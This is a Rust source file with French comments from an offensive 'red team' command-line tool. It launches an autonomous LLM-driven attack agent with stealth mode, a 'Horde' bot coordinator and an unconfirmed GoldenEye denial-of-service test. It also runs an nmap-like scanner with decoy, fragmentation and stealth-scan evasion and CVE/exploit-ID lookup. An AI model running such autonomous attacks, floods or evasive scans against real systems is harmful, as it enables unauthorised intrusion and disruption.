// Helpers
// ---------------------------------------------------------------

/// Extrait les noms de paramètres GET d'une URL
fn extract_query_params(url: &str) -> Vec<String> {
    url.split('?')
        .nth(1)
        .unwrap_or("")
        .split('&')
        .filter_map(|p| {
            let name = p.split('=').next()?;
            if name.is_empty() {
                None
            } else {
                Some(name.to_string())
            }
        })
        .collect()
}

fn split_host_port(endpoint: &str) -> (String, u16) {
    if let Some(colon) = endpoint.rfind(':') {
        let host = endpoint[..colon].to_string();
        let port = endpoint[colon + 1..].parse::<u16>().ok().unwrap_or(0);
        (host, port)
    } else {
        (endpoint.to_string(), 0)
    }
}

// ── nrtg --ai-agent — lancer l'agent IA autonome ───────────────────────────
async fn run_ai_agent(cli: &Cli) -> Result<()> {
    use ai::attack_planner::RiskLevel;
    use ai::autonomous_agent::{
        default_action_timeout_secs, AgentConfig, AutonomousAgent, MsfConfig,
    };

    // Charger la config effective (priorité config.json > CLI flags > defaults)
    let (targets, risk_rules, cve_db, _, _, _, _, runtime) = load_config_effective(cli);
    if targets.is_empty() {
        eprintln!("❌ Aucune cible définie. Utilisez --targets ou config.json.");
        std::process::exit(1);
    }

    // Récupérer le modèle LLM + provider résolus par load_config_effective
    let (llm_provider, llm_model, llm_api_key, llm_api_base_resolved) = match runtime.llm {
        Some(ref cfg) => {
            let provider_label = match cfg.provider {
                LlmProvider::OpenAi => "OpenAI",
                LlmProvider::OpenRouter => "OpenRouter",
                LlmProvider::Ollama => "Ollama",
            };
            (
                provider_label.to_string(),
                cfg.model.clone(),
                cfg.api_key.clone(),
                cfg.api_base.clone(),
            )
        }
        None => {
            // Fallback si non configuré : OpenRouter (par défaut) + valeur CLI/.env
            let key = std::env::var("OPENROUTER_API_KEY").unwrap_or_default();
            (
                "OpenRouter".to_string(),
                "meta-llama/llama-3.1-8b-instruct".to_string(),
                if key.is_empty() { None } else { Some(key) },
                default_api_base(LlmProvider::OpenRouter).to_string(),
            )
        }
    };

    // Vérifier la clé API (sauf Ollama qui est local)
    let needs_api_key = llm_provider != "Ollama";
    let api_key = llm_api_key.clone().unwrap_or_default();
    if needs_api_key && api_key.is_empty() {
        let env_hint = match llm_provider.as_str() {
            "OpenRouter" => "OPENROUTER_API_KEY",
            _ => "OPENAI_API_KEY",
        };
        eprintln!("❌ Clé API {} manquante.", llm_provider);
        eprintln!("   Ajoutez dans .env : {}=sk-...", env_hint);
        eprintln!("   Ou utilisez --llm-provider ollama pour une IA 100% locale sans clé.");
        if llm_provider == "OpenRouter" {
            eprintln!("   Obtenez une clé gratuite sur : https://openrouter.ai/keys");
        }
        // Indiquer où le .env a été cherché : c'est la cause n°1 de cette erreur
        // lorsque le binaire est lancé depuis un répertoire hors du projet.
        let cwd = std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "?".into());
        let exe_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.display().to_string()))
            .unwrap_or_else(|| "?".into());
        eprintln!("   Répertoires scrutés pour .env : {} · {}", cwd, exe_dir);
        std::process::exit(1);
    }

    // Charger le manifest d'exploits
    let manifest = crate::exploits::load_manifest(&runtime.exploits_path).ok();

    // Session ID : reprendre ou générer
    let session_id = cli
        .session_id
        .clone()
        .unwrap_or_else(|| chrono::Utc::now().format("op-%Y%m%d-%H%M%S").to_string());

    println!("\n🤖 Démarrage de l'agent IA autonome Red Team");
    println!("   Session    : {}", session_id);
    println!("   Objectif   : {}", cli.objective);
    println!(
        "   Cibles     : {} ({} total)",
        targets.first().map(|s| s.as_str()).unwrap_or("?"),
        targets.len()
    );
    println!(
        "   Modèle LLM : {} via {} ({})",
        llm_model, llm_provider, llm_api_base_resolved
    );

    let agent_config = AgentConfig {
        session_id,
        campaign_name: "NRTG Red Team Campaign".to_string(),
        objective: cli.objective.clone(),
        initial_targets: targets,
        save_dir: cli.sessions_dir.clone(),
        openrouter_key: api_key,
        model: llm_model,
        llm_api_base: llm_api_base_resolved,
        stealth_mode: cli.ai_stealth,
        max_risk_level: RiskLevel::High,
        max_iterations: 50,
        confirm_all: cli.confirm_all,
        parallel_scans: cli.parallel,
        http_timeout: clamp_timeout(cli.http_timeout, cli.min_timeout, cli.max_timeout),
        tcp_timeout: clamp_timeout(cli.tcp_timeout, cli.min_timeout, cli.max_timeout),
        action_timeout_secs: default_action_timeout_secs(),
        rl_learn: cli.rl_learn || !cli.no_rl_learn,
        allow_networks: cli.allow_networks.clone().unwrap_or_default(),
        deny_hosts: cli.deny_hosts.clone().unwrap_or_default(),
        assume_yes: cli.yes,
        auto_install: cli.auto_install,
        msf: MsfConfig::from_env(),
    };

    let mut ws_task: Option<tokio::task::JoinHandle<()>> = None;
    let mut emit: Option<crate::live_dashboard::DashboardEmitter> = None;

    if cli.dashboard_live {
        use crate::live_dashboard::{open_browser, LiveHub};
        match LiveHub::bind(cli.dashboard_port).await {
            Ok(hub) => {
                let port = hub.bind_port();
                let url = format!("http://127.0.0.1:{}/", port);

                emit = Some(hub.emitter());
                ws_task = Some(tokio::spawn(async move {
                    hub.serve().await;
                }));

                if !cli.no_dashboard_auto_open {
                    // L'ouverture du navigateur est un confort : un échec
                    // (wslview/xdg-open absent) ne doit pas interrompre le scan.
                    if let Err(e) = open_browser(&url) {
                        eprintln!("  ⚠️  Ouverture navigateur impossible : {}", e);
                    }
                }
                println!("  📊 Live dashboard sur {}", url);
            }
            Err(e) => {
                eprintln!("❌ Erreur démarrage live dashboard: {}", e);
            }
        }
    }

    // Horde Coordinator si --horde-coordinator est actif
    let mut horde_coord_opt: Option<std::sync::Arc<crate::horde::coordinator::HordeCoordinator>> =
        None;
    if cli.horde_coordinator {
        use crate::horde::coordinator::{run_horde_coordinator, HordeCoordinator};
        use crate::horde::crypto::horde_load_master;

        let master_key_bytes = horde_load_master(cli.horde_key.as_deref())
            .map_err(|e| anyhow!("--horde-key / env HORDE_MASTER_KEY: {:?}", e))?;

        let adapt_auto = cli.horde_adapt.to_ascii_lowercase() == "auto";

        let horde_coord = std::sync::Arc::new(HordeCoordinator::new(
            master_key_bytes,
            cli.horde_total_bots,
            adapt_auto,
            cli.sessions_dir.clone(),
        ));
        horde_coord_opt = Some(std::sync::Arc::clone(&horde_coord));

        let horde_bind_addr = cli.horde_bind.clone();
        let horde_port = cli.horde_port;
        let horde_total_bots = cli.horde_total_bots;
        let horde_duration = cli.horde_duration;
        let horde_sessions_dir = cli.sessions_dir.clone();
        let horde_template_cfg = crate::stress::goldeneye::GoldenEyeConfig::default(); // Template vide

        tokio::spawn(async move {
            if let Err(e) = run_horde_coordinator(
                master_key_bytes,
                horde_bind_addr,
                horde_port,
                adapt_auto,
                horde_total_bots,
                horde_duration,
                horde_template_cfg,
                horde_sessions_dir,
            )
            .await
            {
                eprintln!("❌ Erreur Horde Coordinator: {}", e);
            }
        });

        println!(
            "  🧟 Horde Coordinator démarré sur ws://{}:{}/horde",
            cli.horde_bind, cli.horde_port
        );
    }

    let mut agent = AutonomousAgent::new(
        agent_config,
        cve_db,
        risk_rules,
        manifest,
        emit,
        horde_coord_opt,
    )?;

    // Si --dos-goldeneye est présent avec --ai-agent, exécuter directement le stress test
    if let Some(target_url) = cli.dos_goldeneye.clone() {
        use ai::attack_planner::{ActionType, PlannedAction};
        use std::collections::HashMap;

        println!("\n🤖 Mode IA: Exécution directe du stress test GoldenEye...");

        let action = PlannedAction {
            action_type: ActionType::StressTest,
            target: target_url.clone(),
            technique: cli.dos_mode.clone(),
            tool: "goldeneye".to_string(),
            rationale:
                "Exécution directe du stress test demandé par l'utilisateur via --dos-goldeneye"
                    .to_string(),
            risk_level: RiskLevel::High,
            requires_confirmation: false,
            estimated_success_prob: 0.9,
            fallback: None,
            parameters: HashMap::new(),
        };

        match agent.execute_action(&action).await {
            Ok(res) => println!("✅ Stress test GoldenEye terminé: {}", res),
            Err(e) => eprintln!(
                "❌ Erreur lors de l'exécution du stress test GoldenEye: {}",
                e
            ),
        }

        // Abort dashboard task if it was started
        if let Some(task) = ws_task {
            task.abort();
        }
        return Ok(()); // Sortir après l'exécution directe
    }

    let report = agent.run().await?;
    if let Some(task) = ws_task {
        task.abort();
    }

    println!("\n{}", report);
    Ok(())
}

// ── nrtg --netscan — moteur de scan réseau inspiré de nmap ──────────────────
async fn run_netscan(cli: &Cli, target: &str) -> Result<()> {
    use crate::netscan::{self, PortState, TimingTemplate};
    use ansi::*;
    let fire2 = "\x1b[38;5;196m";
    let fire3 = "\x1b[38;5;214m";

    let timing = TimingTemplate::from_u8(cli.timing);
    let params = timing.params();

    println!(
        "\n  {BOLD}{fire2}▍ NETSCAN{RESET}  cible={BOLD}{target}{RESET}  timing={}",
        timing.label()
    );
    println!("  {GRIS}{}{RESET}", "▔".repeat(64));

    // Résolution de la cible : IP littérale, CIDR ou nom d'hôte.
    let targets = resolve_netscan_targets(target).await;
    if targets.is_empty() {
        println!("  {AMBER}⚠{RESET}  Aucune cible résolue pour '{target}'");
        return Ok(());
    }
    println!("  {DIM}{} adresse(s) à traiter{RESET}\n", targets.len());

    // ── Mode découverte d'hôtes (ARP → ICMP echo/timestamp/netmask → ACK/TCP/UDP ping)
    if cli.discover {
        let probe = if netscan::raw_sockets_supported() && netscan::raw_sockets_usable() {
            "ARP + ICMP echo/timestamp/netmask + ACK ping + TCP ping + UDP ping"
        } else {
            "TCP ping + UDP ping (sockets bruts indisponibles : root/CAP_NET_RAW requis)"
        };
        println!("  {DIM}sonde : {probe}{RESET}");
        let alive = netscan::discover_hosts(&targets, &params).await;
        println!(
            "  {MATRIX}✓{RESET}  {} hôte(s) vivant(s) sur {}\n",
            alive.len(),
            targets.len()
        );
        for ip in &alive {
            println!("  {fire2}[UP]{RESET} {BOLD}{ip}{RESET}");
        }
        return Ok(());
    }

    // ── Liste de ports (top-ports, plage explicite ou ports UDP) ────────────
    let mut ports: Vec<u16> = if cli.netscan_udp {
        netscan::default_udp_ports()
    } else if let Some(ref range) = cli.port_range {
        match parse_port_range(range) {
            Ok(p) if !p.is_empty() => p,
            Ok(_) => {
                println!("  {AMBER}⚠{RESET}  Plage de ports vide");
                return Ok(());
            }
            Err(e) => {
                println!("  {AMBER}⚠{RESET}  {e}");
                return Ok(());
            }
        }
    } else {
        netscan::top_ports()
    };

    // ── Évasion réseau (fragmentation IP, leurres, usurpation, ordre) ───────
    let mut evasion = match cli.evasion.as_deref() {
        Some(spec) => match netscan::EvasionOptions::parse(spec) {
            Ok(e) => e,
            Err(e) => {
                println!("  {AMBER}⚠{RESET}  évasion invalide : {e}");
                return Ok(());
            }
        },
        None => netscan::EvasionOptions::default(),
    };
    if cli.decoys > 0 {
        evasion.decoys = cli.decoys as usize;
    }
    if cli.shuffle {
        evasion.randomize_order = true;
    }
    if evasion.randomize_order {
        ports = netscan::shuffle_ports(&ports);
    }
    if evasion.is_enabled() {
        println!("  {DIM}évasion : {}{RESET}", evasion.describe());
    }

    // ── Choix de la technique de scan ───────────────────────────────────────
    let mut technique = if cli.syn {
        if netscan::syn_scan_supported() && netscan::raw_sockets_usable() {
            "syn"
        } else {
            println!("  {AMBER}⚠{RESET}  Scan SYN indisponible (WSL/Linux + root requis) — repli connect");
            "connect"
        }
    } else if cli.netscan_udp {
        "udp"
    } else {
        "connect"
    };
    // `--scan-type` sélectionne explicitement la technique (y compris les scans
    // bruts furtifs FIN/NULL/XMAS/ACK/Maimon/Window, parité nmap -sF/-sN/…).
    let mut stealth_mode: Option<netscan::TcpScanMode> = None;
    if let Some(spec) = cli.scan_type.as_deref() {
        match spec.trim().to_ascii_lowercase().as_str() {
            "connect" => technique = "connect",
            "udp" => technique = "udp",
            other => match netscan::TcpScanMode::from_cli(other) {
                Some(m) => {
                    if netscan::syn_scan_supported() && netscan::raw_sockets_usable() {
                        technique = m.label();
                        stealth_mode = Some(m);
                    } else {
                        println!("  {AMBER}⚠{RESET}  --scan-type {other} exige des paquets bruts (WSL/Linux + root) — repli connect");
                        technique = "connect";
                    }
                }
                None => {
                    println!("  {AMBER}⚠{RESET}  --scan-type inconnu : '{spec}' (connect|udp|syn|fin|null|xmas|ack|maimon|window)");
                    return Ok(());
                }
            },
        }
    }
    // Les leurres et la fragmentation exigent des paquets bruts : on bascule
    // automatiquement sur SYN plutôt que d'afficher une évasion fictive.
    if evasion.requires_raw_sockets() && stealth_mode.is_none() {
        if netscan::syn_scan_supported() && netscan::raw_sockets_usable() {
            println!("  {DIM}évasion active → technique SYN (paquets bruts){RESET}");
            technique = "syn";
            stealth_mode = Some(netscan::TcpScanMode::Syn);
        } else {
            println!(
                "  {AMBER}⚠{RESET}  leurres/fragmentation exigent des paquets bruts (root/CAP_NET_RAW) — NON émis en mode {technique}"
            );
        }
    }
    println!(
        "  {DIM}technique={technique} · {} port(s){RESET}\n",
        ports.len()
    );

    // ── Mode traceroute seul ────────────────────────────────────────────────
    if cli.traceroute {
        for host in &targets {
            println!("  {BOLD}{fire3}traceroute → {host}{RESET}");
            match netscan::traceroute(*host, 30, &params).await {
                Ok(hops) => {
                    for h in &hops {
                        let mark = if h.reached {
                            format!("{MATRIX}✓{RESET}")
                        } else {
                            " ".into()
                        };
                        println!("    {:>2}  {mark} {}", h.ttl, h.render());
                    }
                }
                Err(e) => println!("  {AMBER}⚠{RESET}  {e}"),
            }
            println!();
        }
        return Ok(());
    }

    // ── Corrélation CVE (nécessite la détection de version) ─────────────────
    let cve_db: Option<CveDatabase> = if cli.version_detect {
        let cve_db_path = resolve_config_path(&cli.cve_db);
        match load_cve_db(&cve_db_path) {
            Ok(db) => Some(db),
            Err(_) => {
                println!(
                    "  {DIM}base CVE indisponible ({}) — corrélation ignorée{RESET}",
                    cve_db_path
                );
                None
            }
        }
    } else {
        None
    };

    // Affiche les CVE applicables à un service identifié, triées par
    // exploitabilité (KEV > exploit public > CVSS) avec les EDB-ID connus.
    let print_cves = |m: &netscan::ServiceMatch| {
        let db = match cve_db.as_ref() {
            Some(db) => db,
            None => return,
        };
        let cpe = match m.cpe.as_deref() {
            Some(c) => c,
            None => return,
        };
        let version = match m.version.as_deref() {
            Some(v) => v,
            None => return,
        };
        let product = match crate::cve::cpe_product_segment(cpe) {
            Some(p) => p,
            None => return,
        };
        for (cve, sev, _desc, _vec) in crate::cve::find_cves_for_version(db, &product, version)
            .iter()
            .take(5)
        {
            let entry = crate::cve::lookup_cve(db, cve);
            let mut flags = String::new();
            if entry.map(|e| e.kev).unwrap_or(false) {
                flags.push_str(&format!("  {fire2}[KEV]{RESET}"));
            }
            if let Some(e) = entry {
                for id in &e.edb_ids {
                    flags.push_str(&format!("  {fire2}[EDB-{id}]{RESET}"));
                }
            }
            println!("      {AMBER}▲{RESET} {BOLD}{cve}{RESET} {GRIS}CVSS {sev:.1}{RESET}{flags}");
        }
    };

    for host in &targets {
        let results = if let Some(mode) = stealth_mode {
            netscan::stealth_scan(*host, &ports, &params, &evasion, mode).await
        } else {
            match technique {
                "udp" => netscan::udp_scan(*host, &ports, &params).await,
                _ => netscan::connect_scan(*host, &ports, &params).await,
            }
        };
        let interesting: Vec<_> = results
            .into_iter()
            .filter(|r| r.state.is_interesting())
            .collect();
        if interesting.is_empty() {
            println!("  {GRIS}{host} — aucun port intéressant{RESET}");
            continue;
        }
        println!("  {BOLD}{fire3}{host}{RESET}");
        for r in &interesting {
            // Code couleur par état (nmap) : vert=ouvert, orange=indéterminé,
            // cyan/jaune=non filtré, gris=fermé.
            let (color, label) = match r.state {
                PortState::Open => (MATRIX, "open"),
                PortState::Unfiltered => (fire3, "unfiltered"),
                PortState::OpenFiltered => (AMBER, "open|filtered"),
                PortState::Filtered => (AMBER, "filtered"),
                PortState::Closed => (GRIS, "closed"),
            };
            let mut line = format!(
                "    {} {color}{label}{RESET} {DIM}[{}]{RESET}",
                r.port,
                r.reason.as_nmap()
            );
            let mut svc: Option<netscan::ServiceMatch> = None;
            if cli.version_detect {
                if let Some(m) = r
                    .banner
                    .as_deref()
                    .and_then(|b| netscan::identify_service(r.port, b))
                {
                    line.push_str(&format!("  {fire3}{}{RESET}", m.render()));
                    svc = Some(m);
                }
            } else if let Some(b) = &r.banner {
                let one = b.replace(['\n', '\r'], " ");
                if !one.trim().is_empty() {
                    line.push(' ');
                    line.push_str(&one.chars().take(100).collect::<String>());
                }
            }
            println!("{line}");
            if let Some(m) = &svc {
                print_cves(m);
            }
        }

        // ── Empreinte d'OS v2 (TTL + fenêtre TCP + flag DF) ─────────────────
        if cli.os_detect {
            match netscan::os_probe_fingerprint(*host, &params).await {
                Some(fp) => match netscan::fingerprint_os(&fp) {
                    Some(g) => println!("    {DIM}OS ?{RESET} {}", g.render()),
                    None => println!("    {GRIS}OS ? signaux insuffisants (TTL nul){RESET}"),
                },
                None => println!(
                    "    {GRIS}OS ? empreinte indisponible (root/CAP_NET_RAW requis){RESET}"
                ),
            }
        }

        // ── Moteur de scripts NSE-like ──────────────────────────────────────
        if let Some(spec) = &cli.scripts {
            let scripts = netscan::select_scripts(spec);
            if scripts.is_empty() {
                println!("    {AMBER}⚠{RESET}  aucun script ne correspond à '{spec}'");
            } else {
                let names: Vec<&str> = scripts.iter().map(|s| s.name).collect();
                println!("    {DIM}scripts : {}{RESET}", names.join(", "));
                let findings = netscan::run_scripts(*host, &interesting, &scripts, &params).await;
                for f in findings {
                    let one = f.output.replace(['\n', '\r'], " ");
                    println!(
                        "      {fire2}[{}]{RESET} :{}  {}",
                        f.script,
                        f.port,
                        one.chars().take(120).collect::<String>()
                    );
                }
            }
        }
        println!();
    }
    Ok(())
}

/// Analyse une plage de ports `A-B` ou une liste `80,443,8000-8010`.
fn parse_port_range(spec: &str) -> Result<Vec<u16>, String> {
    let mut out = Vec::new();
    for tok in spec.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()) {
        if let Some((a, b)) = tok.split_once('-') {
            let start: u16 = a
                .trim()
                .parse()
                .map_err(|_| format!("port invalide : {a}"))?;
            let end: u16 = b
                .trim()
                .parse()
                .map_err(|_| format!("port invalide : {b}"))?;
            if start == 0 || end < start {
                return Err(format!("plage invalide : {tok}"));
            }
            out.extend(start..=end);
        } else {
            let p: u16 = tok.parse().map_err(|_| format!("port invalide : {tok}"))?;
            if p == 0 {
                return Err("port 0 invalide".into());
            }
            out.push(p);
        }
    }
    out.dedup();
    Ok(out)
}

/// Résout une cible `--netscan` en liste d'adresses : IP littérale, CIDR ou nom d'hôte.
async fn resolve_netscan_targets(target: &str) -> Vec<std::net::IpAddr> {
    use std::net::IpAddr;
    if let Ok(ip) = target.parse::<IpAddr>() {
        return vec![ip];
    }
    if let Ok(net) = target.parse::<ipnetwork::IpNetwork>() {
        // Plafond de sécurité : ne jamais itérer un /8 par accident.
        const MAX_TARGETS: usize = 4096;
        return net.iter().take(MAX_TARGETS).collect();
    }
    match tokio::net::lookup_host((target, 0)).await {
        Ok(it) => it.map(|sa| sa.ip()).collect(),
        Err(_) => Vec::new(),
    }
}

// ── nrtg --scan-local — détecter gateway + scanner le réseau local ──────────
async fn run_scan_local(cli: &Cli) -> Result<()> {
    use crate::live_dashboard::{eta_smoothed, DashboardEvent, LiveHub};
    use ansi::*;
    let fire2 = "\x1b[38;5;196m";
    let fire3 = "\x1b[38;5;214m";

    println!("\n  {BOLD}{fire2}[ SCAN LOCAL — Détection automatique ]{RESET}\n");

    // Les utilitaires réseau OS (iproute2) peuvent manquer sur un système
    // minimal : installation opt-in, fail-closed sinon (aucun blocage).
    #[cfg(unix)]
    crate::installer::ensure_tool("ip", cli.auto_install, cli.yes).await;

    // ── Détection de la gateway ─────────────────────────────────────────────
    let gateway_ip = match detect_local_gateway() {
        Some(ip) => {
            println!("  {MATRIX}✓{RESET}  Gateway détectée : {BOLD}{fire3}{ip}{RESET}");
            ip
        }
        None => {
            println!("  {AMBER}⚠{RESET}  Gateway non détectée automatiquement.");
            println!("      Essayez : nrtg -t 192.168.1.1:80,192.168.1.1:443 --csv --md --export-api-report");
            println!("      Ou utilisez `ipconfig` (Windows) / `ip route` (Linux) pour trouver votre gateway.");
            return Ok(());
        }
    };

    // Dériver le réseau /24
    let parts: Vec<&str> = gateway_ip.split('.').collect();
    let subnet_prefix = if parts.len() == 4 {
        format!("{}.{}.{}.", parts[0], parts[1], parts[2])
    } else {
        "192.168.1.".into()
    };

    println!("  {GRIS}Réseau local : {RESET}{fire3}{subnet_prefix}0/24{RESET}");

    // ── Ports à scanner sur la gateway ──────────────────────────────────────
    // Ports communs sur routeurs/gateway : admin web, SSH, DNS, SMB, RDP
    let gw_ports = [
        80u16, 443, 8080, 8443, 22, 23, 53, 8000, 8888, 9090, 21, 25, 445, 3389,
    ];
    let gw_targets: Vec<String> = gw_ports
        .iter()
        .map(|p| format!("{}:{}", gateway_ip, p))
        .collect();

    println!(
        "\n  {CYAN}Cibles gateway ({n} ports) :{RESET}",
        n = gw_ports.len()
    );
    for t in &gw_targets {
        println!("    {GRIS}•{RESET} {}", t);
    }

    println!("\n  {fire3}Lancement du scan ciblé…{RESET}\n");

    // ── LIVE DASHBOARD (OPSEC: 127.0.0.1 SEULEMENT) ─────────────────────────
    let mut dashboard_hub_guard: Option<(
        crate::live_dashboard::DashboardEmitter,
        tokio::task::JoinHandle<()>,
        std::sync::Arc<tokio::sync::Notify>,
    )> = None;
    let mut emit: Option<crate::live_dashboard::DashboardEmitter> = None;
    if cli.dashboard_live {
        match LiveHub::bind(cli.dashboard_port).await {
            Ok(hub) => {
                let port = hub.bind_port();
                let emitter = hub.emitter();
                let stop = std::sync::Arc::new(tokio::sync::Notify::new());
                let stop_c = stop.clone();
                let server_handle = tokio::spawn(async move {
                    tokio::select! {
                        _ = hub.serve() => {},
                        _ = stop_c.notified() => {},
                    }
                });
                emit = Some(emitter.clone());
                dashboard_hub_guard = Some((emitter, server_handle, stop));
                println!();
                println!("  {MATRIX}{BOLD}▍ LIVE DASHBOARD{RESET}  {GRIS}Web+WS bindés exclusivement sur 127.0.0.1:{}{RESET}", port);
                println!("    {GRIS}→ Ouvrir ce lien dans le navigateur :{RESET}");
                println!("    {CYAN}●{RESET}  http://127.0.0.1:{port}/   {GRIS}(dashboard auto-connecté WS){RESET}", port = port);
                println!("    {CYAN}○{RESET}  dashboard.html {GRIS}(patch WS injecté automatiquement){RESET}");
                println!(
                    "    {AMBER}⚠{RESET}  {GRIS}Jamais forwarder ce port — OPSEC critique.{RESET}"
                );
                println!();
            }
            Err(e) => {
                eprintln!("  ⚠  Impossible de démarrer le dashboard live: {}", e);
                eprintln!("     → Scan continue en mode classique.");
            }
        }
    }

    // ── Construire les args et lancer le scan principal ──────────────────────
    // On réutilise la logique existante en construisant les targets manuellement
    let http_t = clamp_timeout(cli.http_timeout, cli.min_timeout, cli.max_timeout);
    let tcp_t = clamp_timeout(cli.tcp_timeout, cli.min_timeout, cli.max_timeout);
    let (_, risk_rules, cve_db, _, _, _, _, _runtime) = load_config_effective(cli);
    let start_scan_unix_ms = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let progress_counter = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let reachable_counter = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let cve_counter_accum = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));

    let mut _progress_ticker_handle: Option<tokio::task::JoinHandle<()>> = None;
    if let Some(dash_em) = emit.as_ref() {
        let total_guess = gw_targets.len().max(1);
        let emit_c = dash_em.clone();
        let pc = progress_counter.clone();
        let rc = reachable_counter.clone();
        let cc = cve_counter_accum.clone();
        let start_ts = start_scan_unix_ms;
        _progress_ticker_handle = Some(tokio::spawn(async move {
            let mut eta_cache: Option<f32> = None;
            let mut interval = tokio::time::interval(std::time::Duration::from_millis(100));
            let mut tick: u64 = 0;
            loop {
                interval.tick().await;
                tick = tick.wrapping_add(1);
                let done = pc.load(std::sync::atomic::Ordering::Relaxed);
                let reach = rc.load(std::sync::atomic::Ordering::Relaxed);
                let ncves = cc.load(std::sync::atomic::Ordering::Relaxed);
                let eta = eta_smoothed(eta_cache, done, total_guess, start_ts);
                eta_cache = Some(eta);
                emit_c
                    .send(DashboardEvent::Progress {
                        total: total_guess,
                        done,
                        eta_seconds: eta,
                        reachable: reach,
                        total_cves: ncves,
                    })
                    .await;
                if done >= total_guess {
                    break;
                }
                if tick > 3_600_000 {
                    break;
                }
            }
            let done = pc.load(std::sync::atomic::Ordering::Relaxed);
            let reach = rc.load(std::sync::atomic::Ordering::Relaxed);
            let ncves = cc.load(std::sync::atomic::Ordering::Relaxed);
            emit_c
                .send(DashboardEvent::Progress {
                    total: total_guess,
                    done,
                    eta_seconds: 0.0,
                    reachable: reach,
                    total_cves: ncves,
                })
                .await;
        }));
    }

    use futures::StreamExt;
    // ── QW1: Stealth pacing obligatoire sur --scan-local ──────────────────────
    let stealth_cfg = StealthCfg::from_str(&cli.stealth);
    let concurrency = cli.parallel.max(1).min(stealth_cfg.max_concurrency);
    let mut gw_targets_shuffled: Vec<String> = gw_targets.clone();
    let seed_for_shuffle = {
        use std::hash::{DefaultHasher, Hasher};
        let mut h = DefaultHasher::new();
        h.write_u64(
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis() as u64)
                .unwrap_or(0),
        );
        for t in &gw_targets {
            h.write(t.as_bytes());
        }
        h.finish()
    };
    shuffle_with_seed_rt(&mut gw_targets_shuffled, seed_for_shuffle);

    let cve_db_arc = std::sync::Arc::new(cve_db.clone());
    let risk_arc = std::sync::Arc::new(risk_rules.clone());
    let verify_tls_flag = cli.verify_tls;
    let stealth_cfg_c = stealth_cfg.clone();
    let dashboard_emit_owned: Option<crate::live_dashboard::DashboardEmitter> = emit.clone();

    println!(
        "📡 Scanning {} ports sur {} (concurrency={}, stealth={}, jitter={}-{}ms)",
        gw_targets_shuffled.len(),
        gateway_ip,
        concurrency,
        stealth_cfg.label,
        stealth_cfg.jitter_min_ms,
        stealth_cfg.jitter_max_ms
    );
    let start_elapsed = std::time::Instant::now();

    let results: Vec<Option<(crate::reports::GraphNode, crate::flows::ScanTargetSummary)>> =
        futures::stream::iter(gw_targets_shuffled.into_iter().enumerate())
            .map(move |(idx, t)| {
                let cve_db_c = cve_db_arc.clone();
                let risk_c = risk_arc.clone();
                let stealth = stealth_cfg_c.clone();
                let progress_c = progress_counter.clone();
                let reach_c = reachable_counter.clone();
                let cve_c = cve_counter_accum.clone();
                let emit_for_stream: Option<crate::live_dashboard::DashboardEmitter> =
                    dashboard_emit_owned.clone();
                async move {
                    if idx > 0 && (stealth.jitter_min_ms > 0 || stealth.jitter_max_ms > 0) {
                        let jitter_ms = if stealth.jitter_min_ms == stealth.jitter_max_ms {
                            stealth.jitter_min_ms
                        } else {
                            use rand::Rng;
                            rand::thread_rng()
                                .gen_range(stealth.jitter_min_ms..=stealth.jitter_max_ms)
                        };
                        if jitter_ms > 0 {
                            tokio::time::sleep(std::time::Duration::from_millis(jitter_ms)).await;
                        }
                    }
                    let out =
                        scan_single_target(&t, &cve_db_c, &risk_c, http_t, tcp_t, verify_tls_flag)
                            .await;
                    progress_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    if let Some((ref node, _ref_sum)) = out.as_ref() {
                        if node.reachable {
                            reach_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                        }
                        if !node.cves.is_empty() {
                            cve_c.fetch_add(node.cves.len(), std::sync::atomic::Ordering::Relaxed);
                        }
                        if let Some(e) = emit_for_stream.as_ref() {
                            e.send_node(node).await;
                        }
                    }
                    out
                }
            })
            .buffer_unordered(concurrency)
            .collect()
            .await;

    let nodes: Vec<crate::reports::GraphNode> =
        results.into_iter().flatten().map(|(n, _)| n).collect();

    let open: Vec<&crate::reports::GraphNode> = nodes.iter().filter(|n| n.reachable).collect();
    let elapsed_ms = start_elapsed.elapsed().as_millis();

    // ── Dashboard: Finished event + shutdown ─────────────────────────────────
    if let Some((emitter, server_handle, stop_notify)) = dashboard_hub_guard.take() {
        emitter
            .send(DashboardEvent::Finished {
                total_nodes: nodes.len(),
                reachable: open.len(),
                elapsed_ms,
            })
            .await;
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
        stop_notify.notify_one();
        let _ = tokio::time::timeout(std::time::Duration::from_secs(2), server_handle).await;
    }

    // ── Rapport terminal ─────────────────────────────────────────────────────
    println!("\n  {MATRIX}✓{RESET}  Scan terminé — {BOLD}{}{RESET} port(s) ouvert(s) sur {fire3}{}{RESET}\n",
        open.len(), gateway_ip);

    if open.is_empty() {
        println!("  {AMBER}Aucun port ouvert détecté sur la gateway.{RESET}");
        println!(
            "  {GRIS}Cela peut indiquer un pare-feu actif. Essayez avec --tcp-timeout 5.{RESET}"
        );
    } else {
        println!("  {CYAN}{BOLD}Services découverts :{RESET}");
        for n in &open {
            let risk_icon = match n.risk {
                5 | 4 => "🔴",
                3 => "🟠",
                2 => "🟡",
                _ => "🟢",
            };
            println!(
                "  {risk_icon}  {BOLD}{}:{}{RESET}  svc={CYAN}{}{RESET}  ver={GRIS}{}{RESET}",
                n.host,
                n.port,
                n.services.first().cloned().unwrap_or_default(),
                n.version
            );
            if !n.banner.is_empty() && n.banner != "unknown" {
                let b = n.banner.chars().take(80).collect::<String>();
                println!("      {GRIS}banner: {}{RESET}", b);
            }
        }
    }

    println!();

    // ── Conseil : scan réseau complet ─────────────────────────────────────────
    if !open.is_empty() {
        println!("  {fire3}Conseil — Scanner tout le réseau /24 :{RESET}");
        println!(
            "  {MATRIX}${RESET}  nrtg -t {prefix}0/24:80,{prefix}0/24:443,{prefix}0/24:22 \\",
            prefix = subnet_prefix
        );
        println!("       --parallel 30 --tcp-timeout 2 --csv --md --export-api-report\n");
    }

